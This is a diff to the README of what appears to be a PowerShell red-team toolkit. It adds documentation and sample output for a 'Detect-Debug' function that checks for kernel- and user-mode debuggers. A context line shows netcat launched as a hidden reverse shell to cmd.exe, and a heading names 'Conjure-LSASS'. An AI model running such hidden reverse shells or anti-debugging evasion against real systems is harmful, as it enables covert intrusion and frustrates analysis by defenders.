@@ -45,6 +45,27 @@ Start nc reverse shell with CREATE_NO_WINDOW/SW_HIDE/STARTF_USESHOWWINDOW
 C:\PS> Invoke-CreateProcess -Binary C:\Some\Path\nc.exe -Args "-nv 127.0.0.1 9988 -e C:\Windows\System32\cmd.exe" -CreationFlags 0x8000000 -ShowWindow 0x0 -StartF 0x1
 ```
 
+### Detect-Debug
+
+Showcase a number of techniques to detect the presence of Kernel/User-Mode debuggers from PowerShell.
+
+```
+Sample below is x64 Win8, WinDbg attached to PowerShell.
+C:\PS> Detect-Debug
+
+[+] Detect Kernel-Mode Debugging
+    [?] SystemKernelDebuggerInformation: False
+
+[+] Detect User-Mode Debugging
+    [?] CloseHandle Exception: Detected
+    [?] IsDebuggerPresent: Detected
+    [?] CheckRemoteDebuggerPresent: Detected
+    [?] PEB!BeingDebugged: Detected
+    [?] PEB!NtGlobalFlag: Detected
+    [?] DebugSelf: Detected
+
+```
+
 ## pwnd
 
 ### Conjure-LSASS
